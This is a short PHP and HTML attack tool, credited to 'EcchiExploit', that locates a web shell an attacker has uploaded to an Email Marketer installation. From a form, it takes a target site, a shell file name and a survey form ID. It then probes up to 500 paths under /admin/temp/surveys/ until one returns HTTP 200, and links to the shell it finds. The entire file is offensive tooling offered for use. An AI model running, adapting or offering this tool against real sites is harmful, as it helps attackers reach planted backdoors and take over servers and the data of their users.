<!DOCTYPE html>
<html>
<head>
	<title>Email Marketer Shell Finder</title>
	<meta charset="utf-8">
	<meta name="author" content="./EcchiExploit">
	<meta name="description" content="Shell Finder In Proof Email Marketer">
</head>
<body>
	<h1>Finder Shell In Proof Email Marketer</h1>
	<form method="POST">
		Your Site (example.com) : <input type="text" name="site">
		Your Name Shell (shell.php): <input type="text" name="shell">
		Your FormId : <input type="text" name="id">
		<input type="submit" name="sub">
	</form>
</body>
</html>
<?php
error_reporting(0);
$sub = $_POST['sub'];
$site = $_POST['site'];
$shell = $_POST['shell'];
$id = $_POST['id'];
function curl($host,$formid,$in_id,$youshell){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "$host/admin/temp/surveys/$formid/$in_id/$youshell");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
	curl_setopt($ch, CURLOPT_TIMEOUT, 120);
	$exe = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $info;
}
if (isset($sub)) {
	$filter3 = htmlspecialchars($shell);
	$filter2 = htmlspecialchars($id);
	$filter = htmlspecialchars($site);
	if(!preg_match('#^http(s)?://#',$filter)){
		$url = "http://".$filter;
	}
	else {
		$url = $filter;
	}
	for ($i=1; $i < 501; $i++) { 
		$web = curl($url,$filter2,$i,$filter3);
		if ($web == 200) {
			echo "<font color='green'>Found : <a target='_blank' href='$url/admin/temp/surveys/$filter2/$i/$filter3'>$filter/admin/temp/surveys/$filter2/$i/$filter3</a></font><br>";
			echo "<center>Matching Finished!!</center>";
			break;
		}
		else {
			echo "<font color='red'>Not Found : $url/admin/temp/surveys/$filter2/$i/$filter3</font><br>";
		}
	}
}
?>
